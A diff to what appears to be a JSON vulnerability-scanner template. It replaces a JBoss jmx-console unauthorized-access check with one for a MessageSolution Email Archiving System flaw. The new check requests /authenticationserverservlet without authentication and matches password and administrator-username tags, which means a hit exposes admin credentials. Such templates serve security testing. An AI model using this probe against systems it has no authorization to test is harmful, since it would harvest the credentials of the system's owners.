@@ -1,13 +1,13 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "MessageSolution Email Archiving System EEA Information Disclosure Vulnerability",
+    "Description": "MessageSolution Email Archiving System EEA Information Disclosure Vulnerability, accounts and passwords leaked in source code",
+    "Product": "MessageSolution",
     "author": "chumeng",
     "Request":[
-        {
+                {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/authenticationserverservlet",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -18,11 +18,11 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
-                }, {
+                "Value": "</password>"
+                },{
                     "Operation": "contains", 
                     "Key":"",
-                    "Value": "jboss.web"
+                    "Value": "</administratorusername>"
                     },
                  {
                 "Operation": "code", 
